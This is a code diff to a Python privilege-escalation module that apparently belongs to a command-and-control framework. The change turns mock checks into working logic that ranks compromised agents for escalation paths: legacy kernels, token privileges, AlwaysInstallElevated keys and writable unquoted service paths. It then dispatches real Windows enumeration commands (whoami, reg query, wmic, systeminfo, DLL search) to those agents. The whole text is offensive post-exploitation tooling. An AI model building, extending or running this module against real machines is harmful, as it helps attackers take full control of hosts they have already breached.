@@ -22,38 +22,57 @@ class PrivEscEngine:
         Analyzes agent system info for potential vulnerabilities.
         """
         suggestions = []
-        
-        # 1. OS Version Checks (Mock Kernel Exploits)
-        os_version = system_info.get("os_version", "")
-        if "Windows" in system_info.get("os", ""):
-            if "7" in os_version or "2008" in os_version:
-                 suggestions.append({
-                    "technique": PrivEscTechnique.KERNEL_EXPLOIT.value,
-                    "name": "MS17-010 (EternalBlue)",
-                    "confidence": "HIGH",
-                    "details": "Legacy OS detected. Likely vulnerable to SMB exploits."
-                })
-        
-        # 2. Check Privileges
-        current_privs = system_info.get("privileges", "user")
-        if current_privs == "admin":
+
+        os_name = str(system_info.get("os", "")).lower()
+        os_version = str(system_info.get("os_version", "")).lower()
+        current_privs = str(system_info.get("privileges", "user")).lower()
+
+        # 1) Legacy platform exposure
+        if "windows" in os_name and any(x in os_version for x in ("windows 7", "2008", "2012", "6.1", "6.2")):
+            suggestions.append({
+                "technique": PrivEscTechnique.KERNEL_EXPLOIT.value,
+                "name": "Legacy kernel exploit path",
+                "confidence": "MEDIUM",
+                "details": "Legacy Windows version detected; validate applicable local privilege escalation CVEs."
+            })
+
+        # 2) High privilege context (admin/root)
+        if current_privs in {"admin", "administrator", "root", "system"}:
             suggestions.append({
                 "technique": PrivEscTechnique.TOKEN_MANIPULATION.value,
-                "name": "GetSystem (Token Impersonation)",
+                "name": "Token/SID privilege escalation",
                 "confidence": "HIGH",
-                "details": "Already Admin. Can elevate to SYSTEM via token stealing."
+                "details": f"Current privilege context is '{current_privs}', candidate for SYSTEM/root escalation."
             })
-            
-        # 3. Simulate Registry Checks (AlwaysInstallElevated)
-        # In a real scenario, this would check specific reg keys via C2
-        # For simulation, we check for a 'weak_reg' flag in info or random chance
-        if system_info.get("simulated_vulnerabilities", {}).get("always_install_elevated"):
-             suggestions.append({
+
+        # 3) AlwaysInstallElevated verification from provided registry facts
+        registry = system_info.get("registry", {}) if isinstance(system_info.get("registry"), dict) else {}
+        hkcu = str(registry.get("HKCU_AlwaysInstallElevated", "")).strip()
+        hklm = str(registry.get("HKLM_AlwaysInstallElevated", "")).strip()
+        if hkcu == "1" and hklm == "1":
+            suggestions.append({
                 "technique": PrivEscTechnique.ALWAYS_INSTALL_ELEVATED.value,
                 "name": "AlwaysInstallElevated",
-                "confidence": "MEDIUM",
-                "details": "Registry keys set to allow MSI installation with elevated privileges."
+                "confidence": "HIGH",
+                "details": "Registry keys indicate MSI installation can run elevated."
             })
+
+        # 4) Unquoted service path candidates if service metadata is available
+        services = system_info.get("services", [])
+        if isinstance(services, list):
+            for svc in services:
+                if not isinstance(svc, dict):
+                    continue
+                path = str(svc.get("path", ""))
+                writable = bool(svc.get("writable", False))
+                if " " in path and not path.strip().startswith('"') and writable:
+                    suggestions.append({
+                        "technique": PrivEscTechnique.SERVICE_PATH.value,
+                        "name": "Unquoted service path",
+                        "confidence": "MEDIUM",
+                        "details": f"Writable unquoted service path detected: {path}"
+                    })
+                    break
 
         return suggestions
 
@@ -64,21 +83,57 @@ class PrivEscEngine:
         logger.info(f"[PrivEsc] Attempting {technique} on {agent_id}")
         
         if technique == PrivEscTechnique.TOKEN_MANIPULATION.value:
-            # Task agent to run 'getsystem' equivalent
+            # Verify available token privileges and identity context.
             task_id = await c2_server.submit_task(
                 agent_id=agent_id,
                 task_type="shell",
-                task_data={"command": "whoami /priv"}, # Mock command
+                task_data={"command": "whoami /all"},
                 priority=1
             )
-            return {"status": "initiated", "task_id": task_id, "message": "Attempting token manipulation"}
+            return {"status": "initiated", "task_id": task_id, "message": "Collecting token privileges for escalation path"}
             
         elif technique == PrivEscTechnique.ALWAYS_INSTALL_ELEVATED.value:
-            # Upload MSI and run
-            return {"status": "initiated", "message": "Uploading malicious MSI payload..."}
+            cmd = (
+                'reg query "HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated && '
+                'reg query "HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated'
+            )
+            task_id = await c2_server.submit_task(
+                agent_id=agent_id,
+                task_type="shell",
+                task_data={"command": cmd},
+                priority=1
+            )
+            return {"status": "initiated", "task_id": task_id, "message": "Validating AlwaysInstallElevated registry keys"}
+
+        elif technique == PrivEscTechnique.SERVICE_PATH.value:
+            task_id = await c2_server.submit_task(
+                agent_id=agent_id,
+                task_type="shell",
+                task_data={"command": "wmic service get name,displayname,pathname,startmode"},
+                priority=1
+            )
+            return {"status": "initiated", "task_id": task_id, "message": "Enumerating service paths for hijack opportunities"}
+
+        elif technique == PrivEscTechnique.DLL_HIJACKING.value:
+            task_id = await c2_server.submit_task(
+                agent_id=agent_id,
+                task_type="shell",
+                task_data={"command": "where /r C:\\ *.dll"},
+                priority=1
+            )
+            return {"status": "initiated", "task_id": task_id, "message": "Enumerating DLL load paths"}
+
+        elif technique == PrivEscTechnique.KERNEL_EXPLOIT.value:
+            task_id = await c2_server.submit_task(
+                agent_id=agent_id,
+                task_type="shell",
+                task_data={"command": "systeminfo"},
+                priority=1
+            )
+            return {"status": "initiated", "task_id": task_id, "message": "Collecting kernel/version metadata for exploit matching"}
             
         else:
-            return {"status": "failed", "message": "Technique not implemented yet"}
+            return {"status": "failed", "message": f"Unsupported technique: {technique}"}
 
     def auto_escalate(self, suggestions: List[Dict]) -> Optional[str]:
         """
